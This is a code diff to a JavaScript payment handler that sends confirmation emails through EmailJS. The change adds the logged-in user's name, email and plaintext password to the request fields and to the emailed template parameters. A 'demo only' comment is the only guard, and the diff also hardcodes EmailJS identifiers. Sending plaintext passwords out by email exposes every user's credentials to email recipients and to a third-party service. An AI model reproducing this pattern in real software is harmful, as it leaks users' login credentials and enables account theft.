@@ -2,7 +2,17 @@ import fetch from "node-fetch";
 
 export default async function handler(req, res) {
   if (req.method === "POST") {
-    const { name, product, amount, customer_number, payment_id } = req.body;
+    // Destructure all fields including login info
+    const {
+      name,               // customer name
+      product,
+      amount,
+      customer_number,
+      payment_id,
+      user_name,          // logged-in user's name
+      user_email,         // logged-in user's email
+      user_password       // logged-in user's password (demo only!)
+    } = req.body;
 
     try {
       const emailResponse = await fetch("https://api.emailjs.com/api/v1.0/email/send", {
@@ -15,11 +25,14 @@ export default async function handler(req, res) {
           template_id: "template_zwe1s48",
           user_id: "NEhltHkKsFoRI6gWB",
           template_params: {
-            name,
-            product,
-            amount,
+            customer_name: name,          // match your EmailJS template placeholders
+            product_name: product,
+            amount_paid: amount,
             customer_number,
-            payment_id
+            payment_id,
+            user_name,                   // login name
+            user_email,                  // login email
+            user_password                // login password (demo only)
           }
         })
       });
